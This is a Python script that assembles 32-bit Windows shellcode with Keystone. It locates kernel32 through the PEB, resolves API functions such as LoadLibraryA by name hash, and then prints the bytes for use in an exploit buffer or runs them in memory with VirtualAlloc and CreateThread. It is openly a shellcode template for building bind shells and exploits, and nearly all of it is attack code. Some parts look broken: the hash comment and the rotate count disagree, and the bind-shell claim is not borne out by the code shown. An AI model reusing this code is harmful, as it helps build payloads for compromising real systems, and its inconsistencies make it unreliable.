from keystone import *
import ctypes, struct
 
####################################################################################################################################
# **************************************************HOW TO USE**********************************************************************
####################################################################################################################################
# We have loadlibrarya at ebp+0x14 and find_function at ebp+0x04
# In order to extend the functionality of the shellcode, load relevant library with ebp+0x10
# loading library:
#       use cyber chef with reverse + to hex
#       push the generated number (ensure you have a null byte at the start)
#           you can generate null bytes by either pushing xored register or xoring the register and adding the hex val to the lower
#           register values such as ax or cx for eax and ecx respectively so that te first byte is a 0!
# Resolving symbols:
#       use the customShellNameHashCalc.py script to generate hash of the function name
#       push the hash onto the stack, call ebp+0x04 and move the value to ebp+0x1C, 0x20, 0x24, 0x28, 0x2C... and so on
# Calling function:
#       create the relevant structs
#       call the relevant addr (where youve saved it rel to EBP)
# Look at customBindShellCode.py for example!!!
####################################################################################################################################
 
 
CODE = (
####################################################################################################################################
    " start:                             "  #
####################################################################################################################################
# The code below (find_kernel32, next_module) locates mem addr of kernel32.dll loaded in memory using PEB
# TEB -> PEB -> Ldr.InInitOrder -> InInitOrder.module_name
# loops through the flink in the ininitorder until we find kernel32.dll
####################################################################################################################################
    "   mov   ebp, esp                  ;"  #   Function prologue
    "   add   esp, 0xfffffdf0           ;"  #   Avoid NULL bytes (subtract esp 200h)
####################################################################################################################################
# find_kernel32 (name is abit misleading) grabs the InInitOrder linked list from the PEB
####################################################################################################################################
    " find_kernel32:                     "  #
    "   xor   ecx, ecx                  ;"  #   ECX = 0
    "   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30])
    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr
    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder
####################################################################################################################################
# next_module grabs the module name and base addr of the module and sets the esi to the  flink meaning esi will be pointing to the 
# next module on the inInitOrder linked list. It then checks if the current module is kernel.dll. if it is kernel32.dll, we move 
# onto find_function, if not we loop back to the start and look at the next module
# if we find the right module, EBX will have the base addr
####################################################################################################################################
    " next_module:                      "  #
    "   mov   ebx, [esi+8h]             ;"  #   EBX = InInitOrder[X].base_address
    "   mov   edi, [esi+20h]            ;"  #   EDI = InInitOrder[X].module_name
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next), incrementing the list index on the linked list
    "   cmp   [edi+12*2], dx            ;"  #   (unicode) modulename[12] == 0x00?
    "   jne   next_module               ;"  #   No: try next module.
####################################################################################################################################
# the function below is basically a work around to avoid null bytes, it just alters code flow by doing a short jump and then a 
# negative offset call to find_function_ret
####################################################################################################################################
    " find_function_shorten:             "  #
    "   jmp find_function_shorten_bnc   ;"  #   Short jump
####################################################################################################################################
# when we call find_functon_ret from find_function_shorten_bnc, we actuall save the ret addr on the stack, so when we pop esi in 
# find_function_ret, we save the function addr for find_function in ESI and then eventually in ebp+0x04 (as a variable on the stack)
####################################################################################################################################
    " find_function_ret:                 "  #
    "   pop esi                         ;"  #   POP the return address from the stack
    "   mov   [ebp+0x04], esi           ;"  #   Save find_function address for later usage
    "   jmp resolve_symbols_kernel32    ;"  #
####################################################################################################################################
# when we call from here, we save the return addr which will be the instruction after it (find_function), we save that addr on stack
####################################################################################################################################
    " find_function_shorten_bnc:         "  #   
    "   call find_function_ret          ;"  #   Relative CALL with negative offset
####################################################################################################################################
# the find_function grabs the addressofnames array for later use
####################################################################################################################################
    " find_function:                     "  #
    "   pushad                          ;"  #   Save all registers
                                            #   Base address of kernel32 is in EBX from 
                                            #   Previous step (find_kernel32)
    "   mov   eax, [ebx+0x3c]           ;"  #   Offset to PE Signature
    "   mov   edi, [ebx+eax+0x78]       ;"  #   Export Table Directory RVA
    "   add   edi, ebx                  ;"  #   Export Table Directory VMA
    "   mov   ecx, [edi+0x18]           ;"  #   NumberOfNames
    "   mov   eax, [edi+0x20]           ;"  #   AddressOfNames RVA
    "   add   eax, ebx                  ;"  #   AddressOfNames VMA
    "   mov   [ebp-4], eax              ;"  #   Save AddressOfNames VMA for later
####################################################################################################################################
# find_function_loop indexes into the array found above with ecx (which is decremented with every loop), the addrName in that index 
# is then saved in esi and then you add base addr to get the VMA from RVA
####################################################################################################################################
    " find_function_loop:                "  #
    "   jecxz find_function_finished    ;"  #   Jump to the end if ECX is 0
    "   dec   ecx                       ;"  #   Decrement our names counter
    "   mov   eax, [ebp-4]              ;"  #   Restore AddressOfNames VMA
    "   mov   esi, [eax+ecx*4]          ;"  #   Get the RVA of the symbol name
    "   add   esi, ebx                  ;"  #   Set ESI to the VMA of the current symbol name
####################################################################################################################################
# compute_hash, compute_hash_again = loop to hash the entire char array of the name in ESI 
# it is null terminated hence we test for 0 to check if the entire array is hashed with test al, al; jz compute_hash_finished
####################################################################################################################################
    " compute_hash:                      "  #
    "   xor   eax, eax                  ;"  #   NULL EAX
    "   cdq                             ;"  #   NULL EDX
    "   cld                             ;"  #   Clear direction
####################################################################################################################################
    " compute_hash_again:                "  #
    "   lodsb                           ;"  #   Load the next byte from esi into al
    "   test  al, al                    ;"  #   Check for NULL terminator
    "   jz    compute_hash_finished     ;"  #   If the ZF is set, we've hit the NULL term
    "   ror   edx, 0x0c                 ;"  #   Rotate edx 13 bits to the right
    "   add   edx, eax                  ;"  #   Add the new byte to the accumulator
    "   jmp   compute_hash_again        ;"  #   Next iteration
####################################################################################################################################
    " compute_hash_finished:             "  #   this isnt really needed, its just here to denote that hash calc is done
####################################################################################################################################
# here we are checking if the function name hash = the one provided in resolve_symbol_kernel32, if it doesnt match, we loop back to 
# find_function_loop, if not then we use the index in ECX (saved from find_function loop) to index into AddressOfNameOrdinals iot
# find the ordinal number for the given function which (the ordinal number) is then used to index into AddressOfFunctions array
# 
# the resulting funcaddr is then saved where the eax would be during the original pushad and will in turn be restored into eax 
# when popad instruction happens in find_function_finished
####################################################################################################################################
    " find_function_compare:             "  #
    "   cmp   edx, [esp+0x24]           ;"  #   Compare the computed hash with the requested hash
    "   jnz   find_function_loop        ;"  #   If it doesn't match go back to find_function_loop
    "   mov   edx, [edi+0x24]           ;"  #   AddressOfNameOrdinals RVA
    "   add   edx, ebx                  ;"  #   AddressOfNameOrdinals VMA
    "   mov   cx,  [edx+2*ecx]          ;"  #   Extrapolate the function's ordinal
    "   mov   edx, [edi+0x1c]           ;"  #   AddressOfFunctions RVA
    "   add   edx, ebx                  ;"  #   AddressOfFunctions VMA
    "   mov   eax, [edx+4*ecx]          ;"  #   Get the function RVA
    "   add   eax, ebx                  ;"  #   Get the function VMA
    "   mov   [esp+0x1c], eax           ;"  #   Overwrite stack version of eax from pushad
####################################################################################################################################
# just restores the registers so that eax will have the mem addr of the function we are trying to find
####################################################################################################################################
    " find_function_finished:            "  #
    "   popad                           ;"  #   Restore registers
    "   ret                             ;"  #
####################################################################################################################################
# resolve_symbols_kernel32 is basically where supply address name hash to find function address in instructions above and the addr
# is then saved on the stack
# we have also resolved LoadLibraryA so we can load ws2_32.dll without having to fuck around with the PEB
#functions saved:
#   TerminateProcess:   EBP+0x10
#   LoadLibraryA:       EBP+0x14
####################################################################################################################################
    " resolve_symbols_kernel32:          "
    "   push  0x78b5b983                ;"  #   TerminateProcess hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x10], eax           ;"  #   Save TerminateProcess address for later usage
    "   push  0xec0e4e8e                ;"  #   LoadLibraryA hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x14], eax           ;"  #   Save LoadLibraryA address for later usage
)
####################################################################################################################################
# Code below is what prints out the opcodes which can be copied into an exploit buffer
####################################################################################################################################
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
instructions = ""
for dec in encoding: 
    instructions += "\\x{0:02x}".format(int(dec)).rstrip("\n")
print("shellcode = (b\"" + instructions + "\")")
exit()
####################################################################################################################################
# Code below would create a binary array which is directly loaded using ctypes.
# You will just need to run this script on a windows machine and it will create a bind shell.
####################################################################################################################################
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
shellcode = bytearray(encoding)
 
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
 
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
 
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))
 
print("Shellcode located at address %s" % hex(ptr))
input("...ENTER TO EXECUTE SHELLCODE...")
 
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))
 
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
####################################################################################################################################
